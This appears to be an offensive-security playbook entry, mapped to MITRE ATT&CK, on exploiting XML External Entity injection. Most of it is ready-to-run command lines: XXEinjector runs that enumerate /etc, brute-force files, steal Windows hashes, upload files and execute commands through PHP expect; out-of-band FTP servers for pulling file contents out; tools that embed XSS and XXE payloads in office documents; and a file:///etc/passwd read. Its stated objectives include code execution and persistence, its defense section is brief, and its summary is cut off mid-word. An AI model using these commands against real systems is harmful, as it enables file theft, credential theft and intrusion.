---
id: 7739f29b-c42c-417f-a637-888377e88ad2
name: XML External Entity (XXE) Injection using Various Tools
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:44.006274+00:00'
updated_at: '2023-04-10T20:24:45.345828+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Data from Local System|T1005 - Data from Local System]]'
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Tools]]'
- '[[XML External Entity]]'
commands:
- '[[Bruteforcing files using HTTP out of band method and netdoc protocol]]'
- '[[Clone G-XXE-Basic module with file:///etc/passwd URI]]'
- '[[docem.py - per_document xss]]'
- '[[docem.py - per_file xss]]'
- '[[docem.py - per_place xss]]'
- '[[docem.py - per_place xxe]]'
- '[[Enumerating /etc directory in HTTPS application]]'
- '[[Enumerating /etc directory using gopher for OOB method]]'
- '[[Enumerating unfiltered ports]]'
- '[[Enumerating using direct exploitation]]'
- '[[Executing system commands using PHP expect]]'
- '[[Log requests only]]'
- '[[Run script 230.py with argument 2121]]'
- '[[Second order exploitation]]'
- '[[Start Ruby Server]]'
- '[[Stealing Windows hashes]]'
- '[[Testing for XSLT injection]]'
- '[[Uploading files using Java jar]]'
- '[[xxeftp with uno option]]'
- '[[xxeftp with w and wps options]]'
---

# XML External Entity (XXE) Injection using Various Tools

## Summary

XML External Entity (XXE) Injection is a type of vulnerability that allows an attacker to read or write files on the server or execute remote code. This procedure provides various tools that can be used to exploit this vulnerability. XXE vulnerabilities are typically found in applications that pars

## Description

# Description

XML External Entity (XXE) Injection is a type of vulnerability that allows an attacker to read or write files on the server or execute remote code. This procedure provides various tools that can be used to exploit this vulnerability. XXE vulnerabilities are typically found in applications that parse XML input, such as web applications, and can be exploited using various tools such as XXEFTP, XXEinjector, and Docem. By exploiting this vulnerability, an attacker can gain access to sensitive data, execute arbitrary code, and take control of the system. The business value of this procedure is that it helps organizations identify and remediate XXE vulnerabilities before attackers can exploit them.

## Requirements

1. Access to the target system

1. Tools such as XXEFTP, XXEinjector, and Docem

## Defense

1. Ensure that input validation is in place to prevent XXE vulnerabilities

1. Use a web application firewall (WAF) to block malicious requests

1. Keep software up to date with the latest security patches

## Objectives

1. Identify and exploit XXE vulnerabilities in target systems

1. Gain access to sensitive data and execute arbitrary code on the target system

1. Maintain persistence on the target system

# Instructions

1. To use the xxeftp command, follow these instructions:
1. Open the terminal on your computer.
2. Navigate to the directory where xxeftp is located.
3. Enter the command 'sudo ./xxeftp -uno 443' to start the server on port 443.
4. Alternatively, enter the command './xxeftp -w -wps 5555' to start the server on port 5555 with write access.
5. Use the FTP support for XXE payloads as needed.

The xxeftp command is used to start a mini webserver with FTP support for XXE payloads. The '-uno' option is used to start the server on port 443 with read-only access. The '-w' option is used to start the server with write access. The '-wps' option is used to specify the port number for the write access server. The FTP support allows for the transfer of files between the server and client using the FTP protocol. This command is useful for testing and exploiting XXE vulnerabilities.

**Command** ([[xxeftp with uno option]]):

```bash
sudo ./xxeftp -uno 443
```

**Command** ([[xxeftp with w and wps options]]):

```bash
./xxeftp -w -wps 5555
```

2. To use this command, first download the 230-OOB tool from the provided GitHub link. Then run the command 'python3 230.py 2121' to start the Out-of-Band XXE server. This server can be used to retrieve file contents over FTP and generate payloads using the http://xxe.sh/ website.

This command is used to start an Out-of-Band XXE server which can be used to retrieve file contents over FTP and generate payloads using the http://xxe.sh/ website. The 'python3 230.py 2121' command starts the server on port 2121. This tool can be useful for testing and exploiting XXE vulnerabilities in web applications.

**Command** ([[Run script 230.py with argument 2121]]):

```bash
$ python3 230.py 2121
```

3. Use the following commands to perform different tasks with XXEinjector:

**Code**: [[# Enumerating /etc directory in HTTPS application:]]

> This JSON object provides a list of commands that can be used with XXEinjector tool to perform different tasks. The commands include enumerating directories, exploiting vulnerabilities, brute-forcing files, stealing Windows hashes, uploading files, executing system commands, testing for XSLT injection, and logging requests. Each command has its own set of arguments and options which can be used to customize the command as per the requirement.

**Command** ([[Enumerating /etc directory in HTTPS application]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
```

**Command** ([[Enumerating /etc directory using gopher for OOB method]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
```

**Command** ([[Second order exploitation]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
```

**Command** ([[Bruteforcing files using HTTP out of band method and netdoc protocol]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
```

**Command** ([[Enumerating using direct exploitation]]):

```bash
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
```

**Command** ([[Enumerating unfiltered ports]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
```

**Command** ([[Stealing Windows hashes]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
```

**Command** ([[Uploading files using Java jar]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
```

**Command** ([[Executing system commands using PHP expect]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
```

**Command** ([[Testing for XSLT injection]]):

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
```

**Command** ([[Log requests only]]):

```bash
ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
```

4. To use oxml_xxe, first download the tool from the provided GitHub link. Once downloaded, navigate to the tool's directory and run the command 'ruby server.rb'. This will start the server and allow you to embed XXE/XML exploits into various filetypes. Use the tool's instructions to specify the file you wish to embed the exploit into and the type of exploit you wish to use.

**Code**: [[ruby server.rb]]

> The oxml_xxe tool allows for the embedding of XXE/XML exploits into various filetypes. This can be useful for testing the security of applications that parse these filetypes, as it can help identify vulnerabilities that could be exploited by attackers. The tool supports a variety of filetypes, including DOCX, XLSX, PPTX, ODT, ODG, ODP, ODS, SVG, XML, PDF, JPG, and GIF. The tool provides a variety of different exploits that can be used, each with their own set of arguments and options. It is important to carefully read the tool's instructions and understand the arguments of each exploit before using the tool.

**Command** ([[Start Ruby Server]]):

```bash
ruby server.rb
```

5. The following commands can be used to embed payloads in documents:

1. ./docem.py -s <path_to_sample> -pm xss -pf <path_to_payload_file> -pt per_document -kt -sx docx: This command embeds XSS payloads in a single document. Replace <path_to_sample> with the path to the sample document and <path_to_payload_file> with the path to the file containing XSS payloads.

2. ./docem.py -s <path_to_sample> -pm xxe -pf <path_to_payload_file> -kt -pt per_place: This command embeds XXE payloads in a specific location within a document. Replace <path_to_sample> with the path to the sample document and <path_to_payload_file> with the path to the file containing XXE payloads.

3. ./docem.py -s <path_to_sample> -pm xss -pf <path_to_payload_file> -pm per_place: This command embeds XSS payloads in a specific location within a document. Replace <path_to_sample> with the path to the sample document and <path_to_payload_file> with the path to the file containing XSS payloads.

4. ./docem.py -s <path_to_sample> -pm xss -pf <path_to_payload_file> -pt per_file -kt -sx docx: This command embeds XSS payloads in all documents within a directory. Replace <path_to_sample> with the path to the sample directory and <path_to_payload_file> with the path to the file containing XSS payloads.

**Command** ([[docem.py - per_document xss]]):

```bash
./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
```

**Command** ([[docem.py - per_place xxe]]):

```bash
./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
```

**Command** ([[docem.py - per_place xss]]):

```bash
./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
```

**Command** ([[docem.py - per_file xss]]):

```bash
./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
```

6. This command is used to clone the G-XXE-Basic module to exploit XXE vulnerabilities. The arguments for the command are as follows:
- `TEMPLATEFILE`: The path to the template file.
- `TARGETURL`: The URL of the target website.
- `BASE64ENCODE`: Whether or not to base64 encode the output.
- `DOCTYPE`: The DOCTYPE to use in the XML file.
- `XMLTAG`: The XML tag to use in the XML file.

This command is used to exploit XXE vulnerabilities by cloning the G-XXE-Basic module. The `TEMPLATEFILE` argument specifies the path to the template file, while the `TARGETURL` argument specifies the URL of the target website. The `BASE64ENCODE` argument determines whether or not to base64 encode the output. The `DOCTYPE` argument specifies the DOCTYPE to use in the XML file, while the `XMLTAG` argument specifies the XML tag to use in the XML file. This command is part of the otori toolbox, which is intended to allow useful exploitation of XXE vulnerabilities.

**Command** ([[Clone G-XXE-Basic module with file:///etc/passwd URI]]):

```bash
python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
```

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Data from Local System|T1005 - Data from Local System]]
- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Bruteforcing files using HTTP out of band method and netdoc protocol]]
- [[Clone G-XXE-Basic module with file:///etc/passwd URI]]
- [[docem.py - per_document xss]]
- [[docem.py - per_file xss]]
- [[docem.py - per_place xss]]
- [[docem.py - per_place xxe]]
- [[Enumerating /etc directory in HTTPS application]]
- [[Enumerating /etc directory using gopher for OOB method]]
- [[Enumerating unfiltered ports]]
- [[Enumerating using direct exploitation]]
- [[Executing system commands using PHP expect]]
- [[Log requests only]]
- [[Run script 230.py with argument 2121]]
- [[Second order exploitation]]
- [[Start Ruby Server]]
- [[Stealing Windows hashes]]
- [[Testing for XSLT injection]]
- [[Uploading files using Java jar]]
- [[xxeftp with uno option]]
- [[xxeftp with w and wps options]]

## Tags

- [[Tools]]
- [[XML External Entity]]
